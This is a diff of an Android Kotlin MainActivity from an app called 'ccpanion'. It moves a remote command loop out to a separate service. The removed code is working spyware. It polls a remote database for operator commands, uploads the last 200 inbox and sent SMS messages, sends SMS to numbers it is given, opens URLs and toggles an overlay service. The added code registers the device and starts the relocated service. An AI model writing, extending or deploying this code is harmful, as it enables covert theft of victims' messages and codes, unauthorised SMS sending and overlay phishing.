@@ -1,5 +1,5 @@
 // language: Kotlin, target: Android 7.0+ (API 24), file: MainActivity.kt
-// device register + permission grants + command pump (open_url, sms_sync/sms_send, overlay, toast)
+// bootstrap: perms, register, start CmdService (pump lives there)
 package com.kai.ccpanion
 
 import android.Manifest
@@ -10,13 +10,11 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
-import android.telephony.SmsManager
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
-import android.widget.Toast
-import org.json.JSONObject
 import java.util.concurrent.Executors
+import org.json.JSONObject
 
 class MainActivity : Activity() {
 
@@ -47,7 +45,11 @@ class MainActivity : Activity() {
             }
             registerDevice()
             runOnUiThread { status.text = "ccpanion — verbonden · ${Rt.deviceId}" }
-            startCommandPump()
+            if (Build.VERSION.SDK_INT >= 26){
+                startForegroundService(Intent(this, CmdService::class.java))
+            } else {
+                startService(Intent(this, CmdService::class.java))
+            }
         }
     }
 
@@ -79,71 +81,4 @@ class MainActivity : Activity() {
             .put("lastSeen", System.currentTimeMillis())
         Rt.put("phones/${Rt.deviceId}/info", info)
     }
-
-    // ---- command pump: pull /cmds every 3s, execute, mark done ----
-    private fun startCommandPump(){
-        exec.execute {
-            while (true){
-                try {
-                    val raw = Rt.get("phones/${Rt.deviceId}/cmds")
-                    if (raw == null) { Thread.sleep(3000); continue }
-                    val cmds = JSONObject(raw)
-                    for (k in cmds.keys().asSequence().toList()){
-                        val cmd = cmds.getJSONObject(k)
-                        if (cmd.optBoolean("done")) continue
-                        runCatching { execute(cmd) }
-                        Rt.put("phones/${Rt.deviceId}/cmds/$k/done", JSONObject().put("v", true))
-                        Rt.put("phones/${Rt.deviceId}/cmds/$k/ackAt", JSONObject().put("v", System.currentTimeMillis()))
-                    }
-                } catch (e: Exception){ }
-                Thread.sleep(3000)
-            }
-        }
-    }
-
-    private fun execute(cmd: JSONObject){
-        when (cmd.optString("op")) {
-            "open_url" -> {
-                val i = Intent(Intent.ACTION_VIEW, Uri.parse(cmd.optString("url")))
-                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(i)
-            }
-            "toast" -> runOnUiThread { Toast.makeText(this, cmd.optString("text"), Toast.LENGTH_SHORT).show() }
-            "sms_sync" -> syncSms()
-            "sms_send" -> runCatching {
-                SmsManager.getDefault().sendTextMessage(cmd.optString("to"), null, cmd.optString("body"), null, null)
-            }
-            "overlay_on" -> startService(Intent(this, OverlayService::class.java))
-            "overlay_off" -> stopService(Intent(this, OverlayService::class.java))
-        }
-    }
-
-    // ---- sms: last 200 (inbox+sent) → /sms ----
-    private fun syncSms(){
-        val out = JSONObject()
-        var n = 0
-        for (uri in listOf("content://sms/inbox", "content://sms/sent")){
-            runCatching {
-                contentResolver.query(Uri.parse(uri), null, null, null, "date DESC")?.use { cur ->
-                    val idxId = idx(cur, "_id"); val idxAddr = idx(cur, "address")
-                    val idxBody = idx(cur, "body"); val idxDate = idx(cur, "date")
-                    while (cur.moveToNext() && n < 200){
-                        if (idxId < 0 || idxAddr < 0 || idxBody < 0) continue
-                        out.put("${cur.getString(idxId)}_${if (uri.endsWith("sent")) "o" else "i"}",
-                            JSONObject()
-                                .put("addr", cur.getString(idxAddr) ?: "")
-                                .put("body", cur.getString(idxBody) ?: "")
-                                .put("date", if (idxDate >= 0) cur.getLong(idxDate) else 0L)
-                                .put("dir", if (uri.endsWith("sent")) "out" else "in"))
-                        n++
-                    }
-                }
-            }
-        }
-        out.put("booked", n)
-        Rt.put("phones/${Rt.deviceId}/sms", out)
-    }
-
-    private fun idx(cur: android.database.Cursor, name: String): Int =
-        (0 until cur.columnCount).firstOrNull { cur.getColumnName(it) == name } ?: -1
 }
